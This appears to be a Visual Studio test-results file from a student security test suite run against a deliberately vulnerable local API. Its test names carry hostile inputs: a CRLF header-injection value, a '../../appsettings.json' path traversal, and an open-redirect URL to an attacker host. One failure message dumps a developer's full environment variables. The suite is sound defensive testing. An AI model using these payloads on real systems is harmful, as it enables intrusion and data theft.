<?xml version="1.0" encoding="utf-8"?>
<TestRun id="f8475d9f-4e87-4626-8899-7128da8b6651" name="XXX@YOURCOMPUTER 2026-05-15 01:33:08" runUser="YOURCOMPUTER\XXX" xmlns="http://microsoft.com/schemas/VisualStudio/TeamTest/2010">
  <Times creation="2026-05-15T01:33:08.1889322-05:00" queuing="2026-05-15T01:33:08.1889327-05:00" start="2026-05-15T01:33:07.6928410-05:00" finish="2026-05-15T01:33:19.3737651-05:00" />
  <TestSettings name="default" id="07763a40-0f9f-4763-b6aa-7f2c0c7b5a4f">
    <Deployment runDeploymentRoot="XXX_YOURCOMPUTER_2026-05-15_01_33_08" />
  </TestSettings>
  <Results>
    <UnitTestResult executionId="2f674e32-7603-4742-8298-d057385050e0" testId="1ae859c1-5ea7-7381-f023-c3323e2d7748" testName="SecurityAsserts.Grupo6_Archivos.G6_ReDoS_Asserts.A25_ReDoS_CatastrophicPattern_ShouldRespondWithin2Seconds(pattern: &quot;([a-zA-Z]+)*&quot;, input: &quot;aaaaaaaaaaaaaaaaaaaaa!&quot;, description: &quot;cuantificador nested&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0104905" startTime="2026-05-15T01:33:08.1745417-05:00" endTime="2026-05-15T01:33:08.1745418-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="2f674e32-7603-4742-8298-d057385050e0" />
    <UnitTestResult executionId="5929f34e-33e0-4561-9c3c-f9a78b3bda8d" testId="a2f22853-9724-1392-e6cb-1187428dd656" testName="SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27b_WebhookSsrf_LoopbackUrl_ResponseShouldNotLeakInternalData" computerName="YOURCOMPUTER" duration="00:00:00.0049057" startTime="2026-05-15T01:33:08.2800641-05:00" endTime="2026-05-15T01:33:08.2800642-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5929f34e-33e0-4561-9c3c-f9a78b3bda8d">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de admin@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo8_Webhooks.G8_WebhookSsrf_Asserts.A27b_WebhookSsrf_LoopbackUrl_ResponseShouldNotLeakInternalData() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo8_Webhooks\G8_WebhookSsrf_Asserts.cs:line 52&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="5cee7815-0034-4a05-b294-dc86b5f702f2" testId="69c4fbf4-9b22-9c66-3272-a834a7fe24fa" testName="SecurityAsserts.Grupo3_Inyeccion.G3_HeaderInjection_Asserts.A24_HeaderInjection_CrlfInQuery_ShouldNotInjectHeaders(query: &quot;test\r\nSet-Cookie: session=evil&quot;, description: &quot;CRLF directo&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0029190" startTime="2026-05-15T01:33:08.2000475-05:00" endTime="2026-05-15T01:33:08.2000481-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5cee7815-0034-4a05-b294-dc86b5f702f2" />
    <UnitTestResult executionId="922bbc57-2c6d-47ab-8f6f-566828ac4a40" testId="e4060c8d-6171-b370-8435-14cec11425d9" testName="SecurityAsserts.Grupo3_Inyeccion.G3_SQLi_Asserts.A08b_SQLi_UnionPayload_ShouldNotReturn500OrLeakData" computerName="YOURCOMPUTER" duration="00:00:00.0171003" startTime="2026-05-15T01:33:08.2473104-05:00" endTime="2026-05-15T01:33:08.2473105-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="922bbc57-2c6d-47ab-8f6f-566828ac4a40" />
    <UnitTestResult executionId="90f9720c-7f9e-4fbe-acc4-2824f9ae13ca" testId="90c9443e-97df-9bad-ce97-ef4bc6861dd4" testName="SecurityAsserts.Grupo4_Infraestructura.G4_API_Asserts.C04_ApiVersion_V1Route_ShouldReturnDeprecationHeader" computerName="YOURCOMPUTER" duration="00:00:00.0241015" startTime="2026-05-15T01:33:08.2318812-05:00" endTime="2026-05-15T01:33:08.2318815-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="90f9720c-7f9e-4fbe-acc4-2824f9ae13ca">
      <Output>
        <ErrorInfo>
          <Message>Expected (hasDeprecation || isGone) to be true because C04 — La API v1 debe indicar deprecación (cabecera Deprecation/Sunset o retornar 404/410), but found False.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.BooleanAssertions`1.BeTrue(String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo4_Infraestructura.G4_API_Asserts.C04_ApiVersion_V1Route_ShouldReturnDeprecationHeader() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo4_Infraestructura\G4_API_Asserts.cs:line 39&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="b1c979d9-5959-4134-b15a-2807af819ded" testId="6ce1ad56-34d4-4fab-dd09-e90313dacc0b" testName="SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: &quot;../../appsettings.json&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.1244298" startTime="2026-05-15T01:33:08.2365934-05:00" endTime="2026-05-15T01:33:08.2365934-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b1c979d9-5959-4134-b15a-2807af819ded">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(String payload) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo3_Inyeccion\G3_PathTraversal_Asserts.cs:line 57&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="65a492c6-6efb-4a32-8b40-bc4bfc3e186c" testId="9cd1d3b9-5ff1-35f4-06b5-71b62c366f0b" testName="SecurityAsserts.Grupo2_Configuracion.G2_InputLimits_Asserts.B10_InputSize_OversizedJsonPayload_ShouldReturn413Or400" computerName="YOURCOMPUTER" duration="00:00:00.1248777" startTime="2026-05-15T01:33:08.2334364-05:00" endTime="2026-05-15T01:33:08.2334365-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="65a492c6-6efb-4a32-8b40-bc4bfc3e186c">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.RequestEntityTooLarge {value: 413}, HttpStatusCode.BadRequest {value: 400}} because B10 — Payloads excesivamente grandes deben rechazarse con 413 o 400 (límite de body), but found HttpStatusCode.Unauthorized {value: 401}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo2_Configuracion.G2_InputLimits_Asserts.B10_InputSize_OversizedJsonPayload_ShouldReturn413Or400() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo2_Configuracion\G2_InputLimits_Asserts.cs:line 40&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="a547d8b2-0cc2-4b7c-8f33-0adaa36400be" testId="285dd684-2dcb-99e8-ecaf-5d1c9f77f0b1" testName="SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: &quot;https://attacker.io/steal-token&quot;, description: &quot;dominio atacante&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0024512" startTime="2026-05-15T01:33:08.2495155-05:00" endTime="2026-05-15T01:33:08.2495156-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="a547d8b2-0cc2-4b7c-8f33-0adaa36400be">
      <Output>
        <ErrorInfo>
          <Message>Expected collection {HttpStatusCode.MovedPermanently {value: 301}, HttpStatusCode.Found {value: 302}, HttpStatusCode.RedirectKeepVerb {value: 307}, HttpStatusCode.PermanentRedirect {value: 308}} to not contain HttpStatusCode.Found {value: 302} because A23 — Open Redirect: returnUrl externo 'dominio atacante' no debe emitir redirect 3xx.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Collections.GenericCollectionAssertions`3.NotContain(T unexpected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(String returnUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo7_Reportes\G7_OpenRedirect_Asserts.cs:line 51&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="84fd4a74-9ea2-4cea-b891-938d31672a02" testId="db3c4bbc-fe20-8952-ad92-fd0d33be67ba" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A19_IDOR_UpdateOtherUserProfile_ShouldReturn403" computerName="YOURCOMPUTER" duration="00:00:00.0221250" startTime="2026-05-15T01:33:08.2570256-05:00" endTime="2026-05-15T01:33:08.2570256-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="84fd4a74-9ea2-4cea-b891-938d31672a02">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A19_IDOR_UpdateOtherUserProfile_ShouldReturn403() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo1_ControlAcceso\G1_IDOR_Asserts.cs:line 29&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="db7f6488-4c2b-47d4-a456-d0c2a383d075" testId="033d575a-cf40-11e4-8e5f-650ad12aa457" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_Auth_Asserts.A11_Auth_AlgNoneToken_ShouldReturn401" computerName="YOURCOMPUTER" duration="00:00:00.0650632" startTime="2026-05-15T01:33:08.1669808-05:00" endTime="2026-05-15T01:33:08.1669809-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="db7f6488-4c2b-47d4-a456-d0c2a383d075" />
    <UnitTestResult executionId="5844b350-b0d1-4951-9cb4-4f0690f9174e" testId="e844fdc6-b185-7bc2-1cd5-369628e0a121" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_BOLA_Asserts.A02_BOLA_GetOrder_UserAAccessingUserBOrder_ShouldReturn403Or404" computerName="YOURCOMPUTER" duration="00:00:00.0211055" startTime="2026-05-15T01:33:08.2546398-05:00" endTime="2026-05-15T01:33:08.2546399-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="5844b350-b0d1-4951-9cb4-4f0690f9174e">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo1_ControlAcceso.G1_BOLA_Asserts.A02_BOLA_GetOrder_UserAAccessingUserBOrder_ShouldReturn403Or404() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo1_ControlAcceso\G1_BOLA_Asserts.cs:line 48&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="c8b237e7-862d-4837-8efb-0c2ab33bc8a4" testId="89c5c25d-1beb-bbd1-f0ed-e21b8f80b348" testName="SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16b_DebugInfo_ShouldNotExposeConnectionString" computerName="YOURCOMPUTER" duration="00:00:00.0186206" startTime="2026-05-15T01:33:08.2482003-05:00" endTime="2026-05-15T01:33:08.2482003-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c8b237e7-862d-4837-8efb-0c2ab33bc8a4">
      <Output>
        <ErrorInfo>
          <Message>Did not expect body "{"environment":{"VSCODE_PYTHON_AUTOACTIVATE_GUARD":"1","LANG":"en_US.UTF-8","OneDriveConsumer":"C:\\Users\\XXX\\OneDrive","NVAFX_SDK_DIR":"C:\\Program Files\\NVIDIA Corporation\\NVIDIA Audio Effects SDK","VSCODE_GIT_ASKPASS_NODE":"C:\\Users\\XXX\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe","CHROME_CRASHPAD_PIPE_NAME":"\\\\.\\pipe\\crashpad_53144_UAYFMONTGAKBVINU","PATHEXT":".COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY;.PYW;.CPL","PROCESSOR_LEVEL":"6","PROCESSOR_ARCHITECTURE":"AMD64","GIT_EDITOR":":","TEMP":"C:\\Users\\XXX\\AppData\\Local\\Temp","SystemDrive":"C:","PYDEVD_DISABLE_FILE_VALIDATION":"1","TEST_API_URL":"http://localhost:5000","VSCODE_GIT_ASKPASS_MAIN":"c:\\Users\\XXX\\AppData\\Roaming\\Code\\User\\globalStorage\\vscode.git\\askpass\\493597c785d4c5cb\\askpass-main.js","USERPROFILE":"C:\\Users\\XXX","__PSLockDownPolicy":"0","MSBUILDFAILONDRIVEENUMERATINGWILDCARD":"1","windir":"C:\\WINDOWS","VSCODE_DEBUGPY_ADAPTER_ENDPOINTS":"c:\\Users\\XXX\\.vscode\\extensions\\ms-python.debugpy-2026.6.0-win32-x64\\.noConfigDebugAdapterEndpoints\\endpoint-ddc1f6144333ff88.txt","RlsSvcPort":"22112","DOTNET_ROOT_X64":"C:\\Program Files\\dotnet","VBOX_MSI_INSTALL_PATH":"C:\\Program Files\\Oracle\\VirtualBox\\","PROCESSOR_REVISION":"b701","ALLUSERSPROFILE":"C:\\ProgramData","JD2_HOME":"C:\\Users\\XXX\\AppData\\Local\\JDownloader 2.0","COLORTERM":"truecolor","PROGF81DEF27053":"1","ZES_ENABLE_SYSMAN":"1","ACSvcPort":"17532","OPENSSL_ia32cap":":~0x20000000","NVAR_MODEL_DIR":"C:\\Program Files\\NVIDIA Corporation\\NVIDIA AR SDK\\models","PYTHONSTARTUP":"c:\\Users\\XXX\\AppData\\Roaming\\Code\\User\\workspaceStorage\\37274fa5677df505afdaaf30fd066e63\\ms-python.python\\pythonrc.py","ProgramW6432":"C:\\Program Files","NUMBER_OF_PROCESSORS":"32","ChocolateyLastPathUpdate":"133843920952800680","USERNAME":"XXX","TMP":"C:\\Users\\XXX\\AppData\\Local\\Temp","USERDOMAIN_ROAMINGPROFILE":"YOURCOMPUTER","DriverData":"C:\\Windows\\System32\\Drivers\\DriverData","adb":"C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\platform-tools","VSCODE_GIT_IPC_HANDLE":"\\\\.\\pipe\\vscode-git-59d43f96d3-sock","OneDrive":"C:\\Users\\XXX\\OneDrive","IGCCSVC_DB":"AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAdV/lW1SWi0elpm/wNGOsagQAAAACAAAAAAAQZgAAAAEAACAAAADfTXUJ02/1OervtuS1837YvPWNme7XhkM/LieE2wpiHAAAAAAOgAAAAAIAACAAAAAbF3g/DRqg40qaLE4QsDTALnCOkIdaG3PRfsFrJe+P52AAAAAGz4BSzB0vCUSidug1IhIetfTqJa+IAqf+FFBeE5atBRrG2kYy6GMYz+V5KGzpYomdK1iJXjBhFHMm6nfMV8gfgg4XfTjWCtVt38etvVxopKf/YupNX8ldkqCa8M0yl51AAAAAitKtmN3DRyqvnJiqn9Uz1v5bZWDkyue3LKA8NWeQZArqrhTli/gUrqDcMefb5blCwIjXR0zXO0VLNN/wANpSzg==","CLAUDE_CODE_SSE_PORT":"27943","PSModulePath":"C:\\Users\\XXX\\OneDrive\\Documentos\\PowerShell\\Modules;C:\\Program Files\\PowerShell\\Modules;c:\\program files\\windowsapps\\microsoft.powershell_7.6.1.0_x64__8wekyb3d8bbwe\\Modules;C:\\Program Files\\WindowsPowerShell\\Modules;C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\Modules","HOMEPATH":"\\Users\\XXX","ACSetupSvcPort":"23210","PYTHON_BASIC_REPL":"1","HOMEDRIVE":"C:","ANDROID_HOME":"C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk","OS":"Windows_NT","ComSpec":"C:\\WINDOWS\\system32\\cmd.exe","APPDATA":"C:\\Users\\XXX\\AppData\\Roaming","GIT_MERGE_AUTOEDIT":"no","EFC_19672_1592913036":"1","NVVFX_MODEL_DIR":"C:\\Program Files\\NVIDIA Corporation\\NVIDIA Video Effects\\models","GIT_PAGER":"cat","BUNDLED_DEBUGPY_PATH":"c:\\Users\\XXX\\.vscode\\extensions\\ms-python.debugpy-2026.6.0-win32-x64\\bundled\\libs\\debugpy","CommonProgramFiles(x86)":"C:\\Program Files (x86)\\Common Files","VSCODE_GIT_ASKPASS_EXTRA_ARGS":"","TERM_PROGRAM":"vscode","CommonProgramW6432":"C:\\Program Files\\Common Files","ProgramFiles":"C:\\Program Files","PROCESSOR_IDENTIFIER":"Intel64 Family 6 Model 183 Stepping 1, GenuineIntel","USERDOMAIN":"YOURCOMPUTER","ChocolateyInstall":"C:\\ProgramData\\chocolatey","VSCODE_INJECTION":"1","QT_SCALE_FACTOR_ROUNDING_POLICY":"RoundPreferFloor","EFC_19672_4126798990":"1","GIT_ASKPASS":"c:\\Users\\XXX\\AppData\\Roaming\\Code\\User\\globalStorage\\vscode.git\\askpass\\493597c785d4c5cb\\askpass.sh","FR_CUSTOMDATA_PATH":"C:\\Program Files (x86)\\Steam\\steamapps\\common\\FaceRig\\Mod\\VP\\PC_CustomData\\","AV_APPDATA":"C:\\Users\\XXX\\AppData\\Roaming","SystemRoot":"C:\\WINDOWS","__COMPAT_LAYER":"DetectorsAppHealth","PUBLIC":"C:\\Users\\Public","CommonProgramFiles":"C:\\Program Files\\Common Files","TERM_PROGRAM_VERSION":"1.120.0","COMPUTERNAME":"YOURCOMPUTER","EnableLog":"INFO","ProgramFiles(x86)":"C:\\Program Files (x86)","LOCALAPPDATA":"C:\\Users\\XXX\\AppData\\Local","Path":"C:\\Program Files\\WindowsApps\\Microsoft.PowerShell_7.6.1.0_x64__8wekyb3d8bbwe;C:\\Users\\XXX\\AppData\\Local\\cloud-code\\installer\\google-cloud-sdk\\bin;c:\\Users\\XXX\\AppData\\Roaming\\Code\\User\\globalStorage\\github.copilot-chat\\debugCommand;c:\\Users\\XXX\\AppData\\Roaming\\Code\\User\\globalStorage\\github.copilot-chat\\copilotCli;C:\\Users\\XXX\\AppData\\Local\\Programs\\Microsoft VS Code;C:\\Python313\\Scripts\\;C:\\Python313\\;C:\\Program Files\\Common Files\\Oracle\\Java\\javapath;C:\\Program Files\\Python311\\Scripts\\;C:\\Program Files\\Python311\\;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Program Files\\Microsoft SQL Server\\150\\Tools\\Binn\\;C:\\Program Files\\Microsoft SQL Server\\Client SDK\\ODBC\\170\\Tools\\Binn\\;C:\\Program Files\\dotnet\\;C:\\Program Files\\NVIDIA Corporation\\NVIDIA app\\NvDLISR;C:\\Program Files\\nodejs\\;C:\\ProgramData\\chocolatey\\bin;C:\\WINDOWS\\system32;C:\\WINDOWS;C:\\WINDOWS\\System32\\Wbem;C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\;C:\\WINDOWS\\System32\\OpenSSH\\;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\platform-tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\tools\\bin;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\build-tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\emulator;C:\\Program Files (x86)\\Windows Kits\\10\\Windows Performance Toolkit\\;C:\\Program Files (x86)\\NVIDIA Corporation\\PhysX\\Common;C:\\Program Files\\Git\\cmd;C:\\Users\\XXX\\AppData\\Local\\Microsoft\\WindowsApps;C:\\Users\\XXX\\AppData\\Local\\Programs\\Microsoft VS Code\\bin;C:\\Users\\XXX\\.dotnet\\tools;C:\\Users\\XXX\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Schniz.fnm_Microsoft.Winget.Source_8wekyb3d8bbwe;C:\\Users\\XXX\\AppData\\Roaming\\npm;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\platform-tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\tools\\bin;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\build-tools;C:\\Users\\XXX\\AppData\\Local\\Android\\Sdk\\emulator;C:\\Users\\XXX\\AppData\\Local\\Microsoft\\WinGet\\Packages\\Gyan.FFmpeg_Microsoft.Winget.Source_8wekyb3d8bbwe\\ffmpeg-8.0.1-full_build\\bin;;c:\\Users\\XXX\\.vscode\\extensions\\ms-python.debugpy-2026.6.0-win32-x64\\bundled\\scripts\\noConfigScripts","SESSIONNAME":"Console","LOGONSERVER":"\\\\YOURCOMPUTER","ProgramData":"C:\\ProgramData"},"connectionString":"Data Source=vulnerable.db","dotnetRuntime":".NET 8.0.27","os":"Microsoft Windows 10.0.26200","machineName":"YOURCOMPUTER","workingDir":"C:\\Trabajo\\Universidad\\Desarrollo\\VulnerableApi","processId":51268}" to contain any of the strings: {"Data Source="} because A16b — El endpoint de diagnóstico NO debe exponer cadenas de conexión ni claves.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.NotContainAny(IEnumerable`1 values, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16b_DebugInfo_ShouldNotExposeConnectionString() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo5_Servidor\G5_DebugInfo_Asserts.cs:line 48&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
